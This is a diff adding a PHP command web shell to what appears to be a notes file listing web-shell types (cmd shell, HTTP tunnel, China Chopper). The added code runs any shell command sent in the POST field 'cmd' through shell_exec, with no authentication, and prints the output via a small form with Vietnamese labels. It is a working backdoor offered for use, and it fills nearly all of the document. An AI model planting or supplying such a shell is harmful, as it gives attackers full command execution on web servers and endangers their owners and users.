@@ -28,6 +28,34 @@
 
 1. Cmd shell
 
+```
+<?php
+if (isset($_POST['cmd'])) {
+    $command = $_POST['cmd'];
+    $output = shell_exec($command);
+    echo "<pre>$output</pre>";
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP CmdShell</title>
+</head>
+<body>
+    <form method="POST">
+        <label for="cmd">Nhập lệnh shell:</label><br>
+        <input type="text" name="cmd" id="cmd" required><br>
+        <input type="submit" value="Thực thi">
+    </form>
+</body>
+</html>
+
+```
+
 2. Http tunnel
 
 3. Chooper
